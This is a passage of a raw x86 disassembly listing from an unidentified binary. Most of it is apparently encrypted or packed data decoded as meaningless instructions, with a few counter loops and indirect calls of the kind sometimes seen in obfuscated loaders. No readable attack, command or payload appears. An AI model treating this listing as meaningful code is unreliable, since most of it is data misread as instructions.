  40ac3a:	test   DWORD PTR [eax-0x6c],ebp
  40ac3d:	sub    BYTE PTR [ecx],cl
  40ac3f:	and    al,0x77
  40ac41:	and    DWORD PTR [ecx+esi*8-0x53],0x56e93676
  40ac49:	push   esp
  40ac4a:	pop    ss
  40ac4b:	sub    al,0xa1
  40ac4d:	leave  
  40ac4e:	sub    al,0x38
  40ac50:	push   esp
  40ac51:	hlt    
  40ac52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac53:	push   esp
  40ac54:	lahf   
  40ac55:	jnp    0x40ac78
  40ac57:	cwde   
  40ac58:	xor    ax,0x67b7
  40ac5c:	mov    ebp,0xb6f45861
  40ac61:	xor    DWORD PTR [esi-0x5bb42ff8],eax
  40ac67:	jmp    0x40ac5d
  40ac69:	dec    esi
  40ac6a:	sbb    al,0x4f
  40ac6c:	pop    esi
  40ac6d:	scas   eax,DWORD PTR es:[edi]
  40ac6e:	inc    ebx
  40ac6f:	cmp    eax,0x72b16a46
  40ac74:	pushf  
  40ac75:	mov    ebp,0xe7a29de5
  40ac7a:	jecxz  0x40ac04
  40ac7c:	(bad)  
  40ac7d:	mov    edx,0x8b9f6222
  40ac82:	repz push ebx
  40ac84:	push   es
  40ac85:	cmp    BYTE PTR [ebx],0xc8
  40ac88:	je     0x40b9ed
  40ac8e:	sbb    DWORD PTR ds:0x4337eb,0x7413
  40ac98:	mov    eax,DWORD PTR [ebp-0x14]
  40ac9b:	and    DWORD PTR ds:0x43386f,0x0
  40aca5:	xor    ecx,ecx
  40aca7:	or     ecx,DWORD PTR ds:0x43386f
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x43386f,ecx
  40acb4:	cmp    DWORD PTR ds:0x43386f,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433908
  40acc6:	push   0x43394c
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x43386f,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x43386f
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x43386f,ecx
  40acf7:	cmp    DWORD PTR ds:0x43386f,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43381f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi-0x6ba20d4a],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40acce
  40ad2c:	pop    es
  40ad2d:	sbb    eax,0xc3b6e445
  40ad32:	cld    
  40ad33:	pop    esi
  40ad34:	and    edi,DWORD PTR [ebx]
  40ad36:	fcom   DWORD PTR [edx]
  40ad38:	cdq    
  40ad39:	xor    DWORD PTR [edx],edx
  40ad3b:	mov    ebp,0x57b255bf
  40ad40:	adc    BYTE PTR [ebx],ah
  40ad42:	push   edi
  40ad43:	xchg   edi,eax
  40ad44:	cmp    DWORD PTR [ebp-0x7d],eax
  40ad47:	in     eax,0x7e
  40ad49:	push   edi
  40ad4a:	xor    al,0xdd
  40ad4c:	nop
  40ad4d:	test   DWORD PTR [ecx-0x80],esi
  40ad50:	imul   BYTE PTR [ebx-0x37]
  40ad53:	sub    edx,0xb9250391
  40ad59:	mov    bh,al
  40ad5b:	adc    edx,DWORD PTR [eax]
  40ad5d:	sub    al,BYTE PTR [edi-0x28d1cb2e]
  40ad63:	scas   al,BYTE PTR es:[edi]
  40ad64:	sub    DWORD PTR ss:[ebp+0x603e7a5f],edx
  40ad6b:	(bad)  
  40ad6c:	idiv   BYTE PTR gs:[ecx-0x5289aa09]
  40ad73:	sbb    ecx,DWORD PTR [ecx-0x2b602934]
  40ad79:	xlat   BYTE PTR ds:[ebx]
  40ad7a:	mov    eax,ds:0x1d3bb0a5
  40ad7f:	fld    TBYTE PTR [edx+0x4]
  40ad82:	into   
  40ad83:	lods   al,BYTE PTR ds:[esi]
  40ad84:	ja     0x40ad19
  40ad86:	xchg   ebp,eax
  40ad87:	cmp    ch,ah
  40ad89:	sbb    cl,BYTE PTR ss:[edi+ebp*4+0x6eb5fcc1]
  40ad91:	mov    edx,0x1acabe05
  40ad96:	or     DWORD PTR [ebx+ecx*2-0x6c],esi
  40ad9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad9b:	mov    cl,0xf1
  40ad9d:	pop    edi
  40ad9e:	lds    esi,FWORD PTR [ecx-0x5e5b85f9]
  40ada4:	aam    0xb0
  40ada6:	in     eax,dx
  40ada7:	stos   BYTE PTR es:[edi],al
  40ada8:	sar    BYTE PTR [eax+0xcdc4d8e],1
  40adae:	orps   xmm5,XMMWORD PTR [esi+0x50c5ee58]
  40adb5:	inc    esi
  40adb6:	stc    
  40adb7:	sbb    bl,BYTE PTR ds:0x7b43ca65
  40adbd:	dec    eax
  40adbe:	(bad)  
  40adbf:	leave  
  40adc0:	aaa    
  40adc1:	or     bl,BYTE PTR [ecx+0x3ab44f81]
  40adc7:	inc    esp
  40adc8:	shr    DWORD PTR [esp+ecx*4+0x28afff7f],cl
  40adcf:	pop    edx
  40add0:	data16 gs jno 0x40add4
  40add4:	cmp    bl,bh
  40add6:	jo     0x40ad75
  40add8:	cmp    ebp,edi
  40adda:	pop    ds
  40addb:	mov    eax,0x781ca3e9
  40ade0:	jmp    0x40ae0c
  40ade2:	sub    BYTE PTR [edi-0x3d5df079],bh
  40ade8:	add    eax,0xd4f15e61
  40aded:	adc    DWORD PTR [eax],esi
  40adef:	dec    ebx
  40adf0:	mov    al,0xc4
  40adf2:	push   edi
  40adf3:	mov    bh,0x7f
  40adf5:	ds xchg esi,eax
  40adf7:	enter  0x217d,0xad
  40adfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adfc:	fcmovnb st,st(5)
  40adfe:	std    
  40adff:	mov    eax,0xdceff121
  40ae04:	xchg   esp,eax
  40ae05:	add    al,0x1d
  40ae07:	xor    DWORD PTR [ebp-0x39],eax
  40ae0a:	outs   dx,DWORD PTR ds:[esi]
  40ae0b:	out    0xa7,al
  40ae0d:	loop   0x40adc8
  40ae0f:	dec    ebx
  40ae10:	jmp    0x54d39884
  40ae15:	aas    
  40ae16:	cs xchg esi,eax
  40ae18:	aam    0x79
  40ae1a:	xor    al,0xf4
  40ae1c:	xchg   esp,eax
  40ae1d:	loope  0x40adaf
  40ae1f:	sbb    al,0xbb
  40ae21:	jbe    0x40ae51
  40ae23:	(bad)  
  40ae24:	leave  
  40ae25:	pop    eax
  40ae26:	loope  0x40ae34
  40ae28:	ror    DWORD PTR [eax-0x5a67258f],cl
  40ae2e:	dec    eax
  40ae2f:	dec    edi
  40ae30:	adc    ecx,DWORD PTR [esi-0x46347435]
  40ae36:	inc    esi
  40ae37:	add    DWORD PTR [ecx],0xc019b270
  40ae3d:	sub    BYTE PTR [edx],bl
  40ae3f:	xor    al,cl
  40ae41:	dec    esi
  40ae42:	ja     0x40adeb
  40ae44:	(bad)  
  40ae45:	sbb    eax,edx
  40ae47:	retf   
  40ae48:	loop   0x40ae57
  40ae4a:	fs sbb dl,ah
  40ae4d:	cmp    eax,0x11567c2f
  40ae52:	in     al,dx
  40ae53:	sahf   
  40ae54:	loop   0x40aebe
  40ae56:	adc    eax,DWORD PTR [edx+0x4]
  40ae59:	fist   DWORD PTR [edx+eax*2]
  40ae5c:	jo     0x40ae66
  40ae5e:	xor    al,0x3d
  40ae60:	fsub   QWORD PTR [edx]
  40ae62:	out    0x46,eax
  40ae64:	jmp    0x4ea2:0xeaa0faee
  40ae6b:	sbb    ch,BYTE PTR [ebx-0x6e]
  40ae6e:	dec    edx
  40ae6f:	dec    esp
  40ae70:	call   0x9772:0x13e425ef
  40ae77:	js     0x40ae92
  40ae79:	rol    BYTE PTR [edi+0x2d],0x97
  40ae7d:	push   esp
  40ae7e:	jmp    0xb872a62e
  40ae83:	jge    0x40aea1
  40ae85:	(bad)  
  40ae86:	out    dx,eax
  40ae87:	rcl    esp,cl
  40ae89:	mov    ds:0x87b52d7a,eax
  40ae8e:	imul   esp,esi,0xffffff8c
  40ae91:	sbb    BYTE PTR [ebx],cl
  40ae93:	ss jnp 0x40aee2
  40ae96:	or     cl,BYTE PTR [edx+0x6b65c200]
  40ae9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae9d:	repnz rol DWORD PTR [ebx+0x7c],cl
  40aea1:	and    ah,bh
  40aea3:	inc    edx
  40aea4:	mov    edi,0x663d398e
  40aea9:	sbb    edx,DWORD PTR [eax]
  40aeab:	lds    ebp,FWORD PTR ds:0x6d65f432
  40aeb1:	je     0x40aec6
  40aeb3:	test   BYTE PTR [edx-0x1da5b41],al
  40aeb9:	fsubr  DWORD PTR [edx]
  40aebb:	dec    esp
  40aebc:	or     ebp,DWORD PTR [ebp-0x42]
  40aebf:	int    0xe4
  40aec1:	test   ecx,ebx
  40aec3:	jl     0x40ae4a
  40aec5:	pop    ebx
  40aec6:	cdq    
  40aec7:	pop    eax
  40aec8:	jg     0x40aeb0
  40aeca:	shr    DWORD PTR [edx],cl
  40aecc:	sbb    DWORD PTR [ebx+0x4],ebx
  40aecf:	sbb    DWORD PTR [eax+0x1bc39fab],esp
  40aed5:	sub    al,0xad
  40aed7:	mov    al,0x45
  40aed9:	cmp    bl,0xec
  40aedc:	jge    0x40aed2
  40aede:	pop    esi
  40aedf:	je     0x40af07
  40aee1:	jbe    0x40ae99
  40aee3:	and    bl,BYTE PTR [edx-0x12bddb51]
  40aee9:	dec    ecx
  40aeea:	mov    WORD PTR [esi+eax*4+0x2c],ss
  40aeee:	jmp    0x40ae84
  40aef0:	mov    bh,BYTE PTR [esi-0x74]
  40aef3:	ss or  eax,ebp
  40aef6:	mov    esp,0xbb7f0c14
  40aefb:	out    dx,al
  40aefc:	and    esp,DWORD PTR [edx+ebx*4-0x19c5a9bd]
  40af03:	mov    esi,0x3b9ccd53
  40af08:	mov    al,0xf9
  40af0a:	retf   
  40af0b:	out    dx,eax
  40af0c:	cmp    DWORD PTR [ecx],ecx
  40af0e:	pop    eax
  40af0f:	xor    DWORD PTR [ebp+0x3],0x72a64893
  40af16:	jmp    0x40aee4
  40af18:	sub    esp,DWORD PTR [edx+0x7a]
  40af1b:	jmp    0x40af97
  40af1d:	pop    ds
  40af1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af1f:	pop    ebx
  40af20:	test   BYTE PTR [edx-0x5d],cl
  40af23:	icebp  
  40af24:	inc    ebx
  40af25:	mov    ah,0xa7
  40af27:	test   eax,0x36ac0456
  40af2c:	mov    esp,0x680b1acd
  40af31:	adc    DWORD PTR ds:0x2a3f112a,esi
  40af37:	fcomp  DWORD PTR cs:[bp+di+0x4b]
  40af3c:	adc    al,0xfc
  40af3e:	xchg   DWORD PTR [ecx-0x73],edi
  40af41:	sbb    DWORD PTR ds:0x3bcc3cf9,edi
  40af47:	mov    eax,ds:0x3ac63a21
  40af4c:	fsubp  st(2),st
  40af4e:	mov    ?,WORD PTR [edx-0x41]
  40af51:	push   0x3cee9541
  40af56:	sbb    edi,ecx
  40af58:	cmp    eax,0xab0dbfa3
  40af5d:	ficomp DWORD PTR [ebx-0x4a]
  40af60:	ret    
  40af61:	sbb    dh,dl
  40af63:	pop    ecx
  40af64:	push   ds
  40af65:	jae    0x40af0f
  40af67:	add    DWORD PTR [ebx],edx
  40af69:	les    ecx,FWORD PTR [ebx-0x73b159d8]
  40af6f:	das    
  40af70:	mov    ax,WORD PTR [eax+0x18]
  40af74:	or     ecx,0x7018
  40af7a:	mov    DWORD PTR [ebp-0x20],eax
  40af7d:	mov    eax,DWORD PTR [ebp-0x14]
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x433827
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x4337df
  40af93:	sub    DWORD PTR ds:0x43378f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x4337db,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x4337db
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x4337db,ecx
  40afb8:	cmp    DWORD PTR ds:0x4337db,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x4337db,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x4337db,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x4337db
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x4337db,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x433827,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	mov    esi,edi
  40b019:	adc    DWORD PTR [esi+0x7e7ef764],edx
  40b01f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b023:	ret    0x2420
  40b026:	pop    ss
  40b027:	dec    esp
  40b028:	scas   eax,DWORD PTR es:[edi]
  40b029:	mov    eax,ds:0x5f1333e6
  40b02e:	fnstenv [eax+0x4f72a4f8]
  40b034:	outs   dx,BYTE PTR ds:[esi]
  40b035:	jne    0x40afb9
  40b037:	cdq    
  40b038:	std    
  40b039:	sub    BYTE PTR [ecx],0xf4
  40b03c:	mov    edi,0xf7501a71
  40b041:	pop    ecx
  40b042:	adc    eax,0x10b2d432
  40b047:	ins    BYTE PTR es:[edi],dx
  40b048:	xor    bl,ah
  40b04a:	add    eax,0x7503d84a
  40b04f:	loope  0x40b02e
  40b051:	(bad)  
  40b052:	and    al,0x6d
  40b054:	jmp    0x2c91:0x8d575b07
  40b05b:	neg    al
  40b05d:	pop    ds
  40b05e:	es push 0x34
  40b061:	mov    WORD PTR [edx+0x2b],fs
  40b064:	xchg   DWORD PTR [edx+0x62abb002],ebp
  40b06a:	sub    BYTE PTR [esi+0x6f],cl
  40b06d:	jmp    0x84de268c
  40b072:	pop    ds
  40b073:	mov    bl,0xe5
  40b075:	ficomp WORD PTR [esi-0x10b4aec6]
  40b07b:	rol    DWORD PTR [ecx-0x13],1
  40b07e:	adc    esi,DWORD PTR [esp+esi*4]
  40b081:	pop    esp
  40b082:	fiadd  DWORD PTR [edx+0x70007130]
  40b088:	jne    0x40b100
  40b08a:	jnp    0x40b090
  40b08c:	push   ebx
  40b08d:	leave  
  40b08e:	ins    DWORD PTR es:[edi],dx
  40b08f:	add    BYTE PTR [ebx+0x4d],ch
  40b092:	pop    esp
  40b093:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b094:	cmp    DWORD PTR [edi+0x0],ebx
  40b097:	jne    0x40b05c
  40b099:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b09a:	push   edi
  40b09b:	and    eax,0xb396b49a
  40b0a0:	call   0x944:0xc25f306
  40b0a7:	push   0xffffff98
  40b0a9:	das    
  40b0aa:	bound  edx,QWORD PTR [ebp+0x3e]
  40b0ad:	call   0x2e03:0xaba12b8
  40b0b4:	test   BYTE PTR ds:0xf2fe0cd4,dh
  40b0ba:	push   ds
  40b0bb:	pop    esp
  40b0bc:	fld    DWORD PTR [ebx]
  40b0be:	pushf  
  40b0bf:	fild   WORD PTR [ebx+0x40]
  40b0c2:	(bad)  [edx+0x35]
  40b0c5:	inc    ebp
  40b0c6:	cdq    
  40b0c7:	cmp    al,0x31
  40b0c9:	push   cs
  40b0ca:	cmc    
  40b0cb:	and    eax,0xb933f44c
  40b0d0:	mov    gs,WORD PTR [ecx+0x1f]
  40b0d3:	adc    al,0xfc
  40b0d5:	out    0x92,al
  40b0d7:	or     al,0x8d
  40b0d9:	rcr    BYTE PTR [esi+0x69ca6341],0x44
  40b0e0:	(bad)  
  40b0e2:	or     DWORD PTR [ebx],ebp
  40b0e4:	pop    ebp
  40b0e5:	loop   0x40b0eb
  40b0e7:	loopne 0x40b15e
  40b0e9:	xchg   esi,eax
  40b0ea:	lea    esi,[ebx+eax*1-0x3c6430b1]
  40b0f1:	loope  0x40b0b7
  40b0f3:	cmp    cl,dl
  40b0f5:	dec    edi
  40b0f6:	hlt    
  40b0f7:	mov    ah,ah
  40b0f9:	jge    0x40b126
  40b0fb:	mov    esp,ebx
  40b0fd:	xor    dl,BYTE PTR [ebx+eax*2]
  40b100:	inc    edx
  40b101:	jmp    DWORD PTR [edx+0x63]
  40b104:	mov    dh,0xb
  40b106:	xchg   edx,eax
  40b107:	sbb    eax,0x9a651eeb
  40b10c:	sbb    cl,BYTE PTR [esi+0x59bf2b96]
  40b112:	or     al,0x98
  40b114:	fs call 0x2bbfc5b8
  40b11a:	pop    ebp
  40b11b:	or     eax,0xa97bbae3
  40b120:	aas    
  40b121:	mov    bh,0xc1
  40b123:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b124:	or     esi,ecx
  40b126:	sbb    BYTE PTR [ebx],al
  40b128:	mov    cl,0x8b
  40b12a:	sub    DWORD PTR [edx],esi
  40b12c:	pop    edi
  40b12d:	fild   QWORD PTR [esi]
  40b12f:	fadd   QWORD PTR [esi]
  40b131:	sub    DWORD PTR [edi+0x593d4c66],0xa60d590
  40b13b:	or     al,0x80
  40b13d:	out    0xa4,al
  40b13f:	call   0x7b85:0xbec1a0fc
  40b146:	cmp    esp,edx
  40b148:	mov    ds:0x1bd23648,eax
  40b14d:	in     al,0x4c
  40b14f:	pop    esp
  40b150:	pop    ebx
  40b151:	inc    ecx
  40b152:	aas    
  40b153:	loopne 0x40b0d6
  40b155:	sub    BYTE PTR [edi-0x31673e3],0xa3
  40b15c:	enter  0xf445,0x95
  40b160:	pop    es
  40b161:	fs out dx,al
  40b163:	fidiv  DWORD PTR [ebx]
  40b165:	in     al,0x9f
  40b167:	retf   
  40b168:	sub    al,0x15
  40b16a:	or     DWORD PTR [edi],esp
  40b16c:	jne    0x40b120
  40b16e:	pushf  
  40b16f:	lahf   
  40b170:	inc    edi
  40b171:	sti    
  40b172:	ja     0x40b16a
  40b174:	sbb    al,0xfb
  40b176:	sbb    edi,DWORD PTR ds:0x7fe1d967
  40b17c:	pop    ecx
  40b17d:	mov    cl,0x7f
  40b17f:	xor    eax,0xe4c9d731
  40b184:	aas    
  40b185:	icebp  
  40b186:	add    bh,ch
  40b188:	push   ebp
  40b189:	pop    esp
  40b18a:	push   0x13
  40b18c:	lds    edi,FWORD PTR [edx]
  40b18e:	in     eax,0x37
  40b190:	inc    ecx
  40b191:	mov    dh,0x71
  40b193:	jmp    0x6dfb:0xabc2089e
  40b19a:	mov    esi,0x107791ec
  40b19f:	pop    ebx
  40b1a0:	mov    ds:0xc703c4c0,al
  40b1a5:	xor    edx,DWORD PTR [ebx+edx*8-0x78]
  40b1a9:	imul   eax,edi,0xc169cf4d
  40b1af:	or     eax,0x2a323680
  40b1b4:	(bad)  
  40b1b5:	mov    al,ds:0xb7cf7433
  40b1ba:	sbb    DWORD PTR [ebp-0x63],ecx
  40b1bd:	add    dl,ch
  40b1bf:	mov    esi,0xd3068ed
  40b1c4:	jns    0x40b234
  40b1c6:	sbb    cx,sp
  40b1c9:	mov    edi,0x436a444f
  40b1ce:	(bad)  
  40b1cf:	(bad)  
  40b1d0:	jmp    0x40b218
  40b1d2:	retf   0x5c4d
  40b1d5:	ss xor eax,0x8e4b273e
  40b1db:	cld    
  40b1dc:	adc    esp,edx
  40b1de:	retf   0x7a8d
  40b1e1:	fcom   st(3)
  40b1e3:	dec    edx
  40b1e4:	icebp  
  40b1e5:	mov    edx,0xabec1ba9
  40b1ea:	mov    WORD PTR [esi-0x690f6f7d],fs
  40b1f0:	adc    BYTE PTR [edi+0x62],bh
  40b1f3:	leave  
  40b1f4:	mov    ch,0x7c
  40b1f6:	(bad)  
  40b1f8:	mov    ?,WORD PTR [edi-0x32]
  40b1fb:	das    
  40b1fc:	nop
  40b1fd:	cmp    esi,DWORD PTR gs:[eax]
  40b200:	cmc    
  40b201:	clc    
  40b202:	jo     0x40b23f
  40b204:	pop    esi
  40b205:	sahf   
  40b206:	jne    0x40b271
  40b208:	out    0x4b,al
  40b20a:	cmp    DWORD PTR ss:[ecx-0x164eed70],ebx
  40b211:	(bad)  
  40b213:	mov    esp,esp
  40b215:	and    al,0xd4
  40b217:	inc    ecx
  40b218:	je     0x40b1f8
  40b21a:	outs   dx,DWORD PTR ss:[esi]
  40b21c:	add    BYTE PTR [edi+0x38],ah
  40b21f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b220:	adc    ecx,0xaef2f622
  40b226:	out    dx,al
  40b227:	or     al,0x69
  40b229:	xchg   ebp,eax
  40b22a:	in     eax,dx
  40b22b:	inc    DWORD PTR [edi+0x20]
  40b22e:	pop    ebp
  40b22f:	xor    DWORD PTR [ebx+0x5c],ebx
  40b232:	lods   al,BYTE PTR ds:[esi]
  40b233:	or     al,0xf0
  40b235:	shl    DWORD PTR ds:[ebp+0x51366380],cl
  40b23c:	retf   0xed81
  40b23f:	(bad)  
  40b240:	fmul   QWORD PTR [ecx]
  40b242:	pop    edi
  40b243:	sub    dh,BYTE PTR [ebx-0x4072b410]
  40b249:	lods   eax,DWORD PTR ds:[esi]
  40b24a:	pop    ss
  40b24b:	and    BYTE PTR [eax],bl
  40b24d:	and    eax,0x6d14b456
  40b252:	xchg   edi,eax
  40b253:	add    cl,BYTE PTR [eax]
  40b255:	inc    esp
  40b256:	pop    ebx
  40b257:	or     bh,BYTE PTR [esi]
  40b259:	sar    bl,1
  40b25b:	or     eax,0x4fc6316a
  40b260:	shl    DWORD PTR [ecx+0x35],cl
  40b263:	in     al,dx
  40b264:	jecxz  0x40b265
  40b266:	jle    0x40b263
  40b268:	mov    ah,0x8b
  40b26a:	inc    ebp
  40b26b:	in     al,dx
  40b26c:	mov    ecx,DWORD PTR [ebp+0x8]
  40b26f:	add    ecx,DWORD PTR [eax+0x24]
  40b272:	jmp    0x40b4d5
  40b277:	jno    0x40b206
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	sub    DWORD PTR [edx],edi
  40b285:	add    DWORD PTR ds:0x7e7ef22e,ebx
  40b28b:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b28f:	test   eax,0xb826b382
  40b294:	fwait
  40b295:	sbb    DWORD PTR [esi],0x14c54a84
  40b29b:	out    dx,eax
  40b29c:	sbb    BYTE PTR [ecx-0x5d91b0d2],bh
  40b2a2:	mov    ds:0x5ef3b586,al
  40b2a7:	hlt    
  40b2a8:	cmp    eax,0x5efa39d6
  40b2ad:	push   0x14
  40b2af:	adc    esi,esi
  40b2b1:	adc    edi,edx
  40b2b3:	xor    eax,0x39153c3d
  40b2b8:	mov    edi,0x7994b929
  40b2bd:	aad    0xd9
  40b2bf:	inc    edx
  40b2c0:	popf   
  40b2c1:	mov    edx,0x3879a959
  40b2c6:	fwait
  40b2c7:	and    eax,DWORD PTR [edi+0x7e]
  40b2ca:	ins    BYTE PTR es:[edi],dx
  40b2cb:	(bad)  
  40b2cd:	mov    ds:0x8af75e7,al
  40b2d2:	loop   0x40b2dc
  40b2d4:	add    DWORD PTR [ebx+0x7d],esi
  40b2d7:	mov    edi,0xe63a5f05
  40b2dc:	ja     0x40b32b
  40b2de:	xchg   esp,eax
  40b2df:	pop    edi
  40b2e0:	ficomp DWORD PTR [ecx+0x2d]
  40b2e3:	pop    eax
  40b2e4:	sbb    eax,esp
  40b2e6:	xor    BYTE PTR [ebp+0x740b2fd7],dh
  40b2ec:	adc    eax,0x64230342
  40b2f1:	jge    0x40b35b
  40b2f3:	lods   eax,DWORD PTR ds:[esi]
  40b2f4:	(bad)  
  40b2f5:	rcl    bh,1
  40b2f7:	pop    ebp
  40b2f8:	fcom   st(3)
  40b2fa:	stos   DWORD PTR es:[edi],eax
  40b2fb:	jg     0x40b2af
  40b2fd:	hlt    
  40b2fe:	jmp    0x95063f34
  40b303:	cmp    ebx,DWORD PTR [ebp+0x662b073]
  40b309:	pop    edx
  40b30a:	adc    al,0xdd
  40b30c:	dec    esi
  40b30d:	shl    DWORD PTR [esi],0xba
  40b310:	aad    0x19
  40b312:	popf   
  40b313:	cmp    cl,BYTE PTR [eax+0x2eb4491f]
  40b319:	dec    ebx
  40b31a:	stos   BYTE PTR es:[edi],al
  40b31b:	rol    DWORD PTR [edx],1
  40b31d:	das    
  40b31e:	inc    ecx
  40b31f:	ret    0xfd1a
  40b322:	push   edi
  40b323:	lock in eax,0x30
  40b326:	cmc    
  40b327:	mov    edi,0x63db7c09
  40b32c:	sbb    ecx,esp
  40b32e:	adc    DWORD PTR [ebp+0x6ecdf579],edx
  40b334:	stos   DWORD PTR es:[edi],eax
  40b335:	mov    dh,0xda
  40b337:	jne    0x40b2c0
  40b339:	imul   ebp,DWORD PTR [edi-0x57],0xffffff8f
  40b33d:	mov    edi,0x82c8a6a1
  40b342:	jns    0x40b366
  40b344:	sbb    edi,ebp
  40b346:	mov    eax,ds:0x8030c858
  40b34b:	popf   
  40b34c:	jg     0x40b36c
  40b34e:	fs sbb eax,0xaba02a2e
  40b354:	dec    edx
  40b355:	xchg   BYTE PTR [ecx-0x5d],bh
  40b358:	or     cl,BYTE PTR [edx-0x79]
  40b35b:	mov    BYTE PTR [esi-0x6a59b3f9],ch
  40b361:	cwde   
  40b362:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b363:	loope  0x40b3ae
  40b365:	int    0x90
  40b367:	ss daa 
  40b369:	fisub  WORD PTR [eax+0x76]
  40b36c:	cli    
  40b36d:	mov    WORD PTR [ebx+0x6],gs
  40b370:	popa   
  40b371:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b372:	push   cs
  40b373:	(bad)  
  40b374:	ror    edi,cl
  40b376:	mov    eax,ss:0xb1060e63
  40b37c:	ret    
  40b37d:	loop   0x40b3cc
  40b37f:	dec    ebp
  40b380:	sbb    dl,BYTE PTR ds:0x50cc44ae
  40b386:	mov    edx,0xeeef1d16
  40b38b:	shl    DWORD PTR [eax-0x1512184e],0x7c
  40b392:	aam    0x61
  40b394:	or     al,0xb8
  40b396:	cmp    DWORD PTR [edi+0x62332938],esp
  40b39c:	cmp    BYTE PTR [esi-0x67da5c80],bh
  40b3a2:	mul    DWORD PTR [ebx]
  40b3a4:	rol    ecx,0x85
  40b3a7:	add    eax,DWORD PTR [eax+0x3b]
  40b3aa:	clc    
  40b3ab:	xchg   edx,eax
  40b3ac:	cld    
  40b3ad:	(bad)  
  40b3ae:	imul   DWORD PTR [ecx+0x5d2bbe7b]
  40b3b4:	(bad)  
  40b3b5:	mov    ebx,0x3284d8fe
  40b3ba:	lea    eax,[edi+esi*2+0x72b27ea7]
  40b3c1:	out    0xa7,al
  40b3c3:	ss jno 0x40b360
  40b3c6:	aaa    
  40b3c7:	into   
  40b3c8:	loopne 0x40b38e
  40b3ca:	popa   
  40b3cb:	outs   dx,DWORD PTR ds:[esi]
  40b3cc:	or     al,0xe
  40b3ce:	call   0x84df:0xad5c0200
  40b3d5:	lahf   
  40b3d6:	inc    edi
  40b3d7:	adc    BYTE PTR [ecx-0x45],bl
  40b3da:	adc    BYTE PTR [edi+0x2a1a43a4],al
  40b3e0:	sahf   
  40b3e1:	in     al,dx
  40b3e2:	popa   
  40b3e3:	cli    
  40b3e4:	fs pop eax
  40b3e6:	xor    DWORD PTR [esi+esi*1-0x68],0xffffffad
  40b3eb:	test   al,0xe2
  40b3ed:	jno    0x40b3d9
  40b3ef:	or     edi,edi
  40b3f1:	adc    cl,dh
  40b3f3:	sub    ch,BYTE PTR [edx+0x8]
  40b3f6:	inc    edx
  40b3f7:	xchg   ebx,eax
  40b3f8:	or     DWORD PTR [esp+ecx*8],0x77
  40b3fc:	sub    eax,eax
  40b3fe:	std    
  40b3ff:	inc    esi
  40b400:	pushf  
  40b401:	push   ds
  40b402:	xor    cl,cl
  40b404:	repnz cmp eax,eax
  40b407:	xchg   ecx,eax
  40b408:	ret    0xe833
  40b40b:	pop    ebx
  40b40c:	bnd jg 0x40b39e
  40b40f:	and    dh,ah
  40b411:	xchg   ebp,eax
  40b412:	inc    esi
  40b413:	cli    
  40b414:	xchg   BYTE PTR [ecx+0x5edd992],ah
  40b41a:	daa    
  40b41b:	call   0x7df05cc2
  40b420:	aas    
  40b421:	leave  
  40b422:	mov    ?,WORD PTR [ecx-0x54]
  40b425:	adc    dl,BYTE PTR [edx+0x6014e8d4]
  40b42b:	push   ebp
  40b42c:	jge    0x40b3d6
  40b42e:	add    eax,0xdfe6d45b
  40b433:	lock aad 0x93
  40b436:	dec    edx
  40b437:	mov    ah,0xde
  40b439:	xor    DWORD PTR [edx+0x2a],0x9fca0323
  40b440:	lea    esp,[ebx+0x17bd3d30]
  40b446:	je     0x40b3ee
  40b448:	push   ss
  40b449:	and    al,0xa2
  40b44b:	aaa    
  40b44c:	xor    edx,ecx
  40b44e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b44f:	inc    edi
  40b450:	popa   
  40b451:	fwait
  40b452:	nop
  40b453:	cdq    
  40b454:	xchg   ebp,eax
